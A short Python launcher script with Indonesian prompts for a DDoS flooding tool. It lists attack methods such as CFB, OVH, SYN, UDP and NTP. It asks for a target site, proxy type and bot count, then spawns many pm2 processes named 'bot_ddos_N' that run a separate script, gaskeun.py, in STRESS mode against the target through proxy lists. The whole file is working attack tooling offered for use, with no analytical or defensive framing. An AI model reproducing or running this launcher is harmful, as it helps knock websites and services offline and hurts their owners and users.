import os, random

# For Using Pm2 Manager
# pm2 start gaskeun.py --name=${args[1]} --interpreter=python3 --restart-delay 30000 -- ${args[2]} ${args[3]} ${args[4]} ${args[5]} ${args[6]} ${args[7]} ${args[8]}

method = ["CFB", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB", "TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]

def gas():
    target_site = input('Target      : ')
    proxy_types = input('Proxy_Type  : ')
    jumlah_bot = int(input('Jumlah Bot  : '))
    for _ in range(jumlah_bot):
        os.system(f'pm2 start gaskeun.py --name=bot_ddos_{_} --interpreter=python3 --restart-delay 30 STRESS {target_site} {proxy_types} 100000 proxy_bot_{_}.txt 100 100000')
    print('DONE')


if __name__=='__main__':
    gas()
